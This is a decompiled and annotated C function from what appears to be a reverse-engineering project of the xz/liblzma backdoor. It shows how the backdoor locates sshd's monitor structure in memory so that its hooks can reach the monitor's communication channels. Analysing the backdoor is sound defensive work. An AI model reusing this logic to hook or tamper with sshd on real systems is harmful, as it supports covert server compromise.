// /home/kali/xzre-ghidra/xzregh/103DB0_sshd_find_monitor_struct.c
// Function: sshd_find_monitor_struct @ 0x103DB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_struct(elf_info_t * elf, string_references_t * refs, global_context_t * ctx)


/*
 * AutoDoc: Instruments the ten monitor-side helpers referenced in `string_refs` (allocation, channel handling, recv/send paths, etc.) by calling `sshd_find_monitor_field_addr_in_function` for each one. Every returned BSS address is tallied, and once a value shows up at least five times the routine records it in `ctx->struct_monitor_ptr_address` so later hooks can dereference monitor->monitor_to_child_fd/child_to_monitor_fd directly. The helper also emits a `secret_data_append_from_call_site` breadcrumb so the secret-data mirroring code knows when monitor discovery succeeded.
 */

#include "xzre_types.h"

BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_context_t *ctx)

{
  u8 *code_start;
  BOOL secret_append_ok;
  u8 *data_start;
  u8 *data_end;
  ulong candidate_slot;
  uint top_vote_count;
  long vote_inner_idx;
  ulong winning_candidate_idx;
  long vote_idx;
  void **candidate_cursor;
  uint *vote_cursor;
  u8 zero_seed;
  u64 data_segment_size;
  uint monitor_vote_table[20];
  void *monitor_candidates[10];
  
  zero_seed = 0;
  // AutoDoc: Log the monitor discovery entry point so the secret-data tap can mirror that progress later.
  secret_append_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
  // AutoDoc: Abort when the mm_request metadata is missing—without it there is no stable monitor struct to discover.
  if ((secret_append_ok != FALSE) && (data_segment_size = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
    ctx->monitor_struct_slot = (monitor **)0x0;
    // AutoDoc: Limit all candidate addresses to sshd’s writable data segment so stray pointers never skew the vote.
    data_start = (u8 *)elf_get_data_segment(elf,&data_segment_size,FALSE);
    if (data_start != (u8 *)0x0) {
      vote_idx = 0;
      data_end = data_start + data_segment_size;
      // AutoDoc: Seed the first half of the vote table with the string-reference indexes for the ten monitor helper functions we trust.
      monitor_vote_table[0] = 4;
      monitor_vote_table[1] = 5;
      monitor_vote_table[2] = 6;
      monitor_vote_table[3] = 7;
      monitor_vote_table[4] = 8;
      monitor_vote_table[5] = 9;
      monitor_vote_table[6] = 10;
      monitor_vote_table[7] = 0xb;
      monitor_vote_table[8] = 0xc;
      monitor_vote_table[9] = 0xd;
      candidate_cursor = monitor_candidates;
      // AutoDoc: Zero both the candidate slots and the tail half of the vote table before collecting fresh samples.
      for (vote_inner_idx = 0x14; vote_inner_idx != 0; vote_inner_idx = vote_inner_idx + -1) {
        *(undefined4 *)candidate_cursor = 0;
        candidate_cursor = (void **)((long)candidate_cursor + (ulong)zero_seed * -8 + 4);
      }
      do {
        // AutoDoc: Walk each monitor helper via its cached function bounds before searching for BSS writes.
        code_start = (u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_start;
        if (code_start != (u8 *)0x0) {
          sshd_find_monitor_field_addr_in_function
          // AutoDoc: Ask the helper to look for MOV [mem],reg stores and cache whatever monitor struct pointer those routines touch.
                    (code_start,(u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_end,
                     data_start,data_end,monitor_candidates + vote_idx,ctx);
        }
        vote_idx = vote_idx + 1;
      } while (vote_idx != 10);
      // AutoDoc: Reuse the upper ten entries of the vote table as counters that track how many times each slot matched.
      vote_cursor = monitor_vote_table + 10;
      for (vote_inner_idx = 10; vote_inner_idx != 0; vote_inner_idx = vote_inner_idx + -1) {
        *vote_cursor = 0;
        vote_cursor = vote_cursor + (ulong)zero_seed * -2 + 1;
      }
      vote_inner_idx = 0;
      do {
        candidate_slot = 0;
        do {
          winning_candidate_idx = candidate_slot & 0xffffffff;
          // AutoDoc: Empty candidate buckets fall through to here, causing the next unused slot to inherit the vote.
          if ((uint)vote_inner_idx <= (uint)candidate_slot) {
            monitor_vote_table[vote_inner_idx + 10] = monitor_vote_table[vote_inner_idx + 10] + 1;
            goto LAB_00103f07;
          }
          candidate_cursor = monitor_candidates + candidate_slot;
          candidate_slot = candidate_slot + 1;
        } while (*candidate_cursor != monitor_candidates[vote_inner_idx]);
        // AutoDoc: Otherwise increment the counter for whichever pointer matched so the most popular candidate can be selected later.
        monitor_vote_table[winning_candidate_idx + 10] = monitor_vote_table[winning_candidate_idx + 10] + 1;
LAB_00103f07:
        vote_inner_idx = vote_inner_idx + 1;
      } while (vote_inner_idx != 10);
      candidate_slot = 0;
      winning_candidate_idx = 0;
      top_vote_count = 0;
      do {
        if (top_vote_count < monitor_vote_table[candidate_slot + 10]) {
          winning_candidate_idx = candidate_slot & 0xffffffff;
          top_vote_count = monitor_vote_table[candidate_slot + 10];
        }
        candidate_slot = candidate_slot + 1;
      } while (candidate_slot != 10);
      // AutoDoc: Only accept a result once at least five helpers agreed on the same pointer, which filters out incidental hits.
      if ((4 < top_vote_count) && ((monitor **)monitor_candidates[winning_candidate_idx] != (monitor **)0x0)) {
        ctx->monitor_struct_slot = (monitor **)monitor_candidates[winning_candidate_idx];
        return TRUE;
      }
    }
  }
  return FALSE;
}

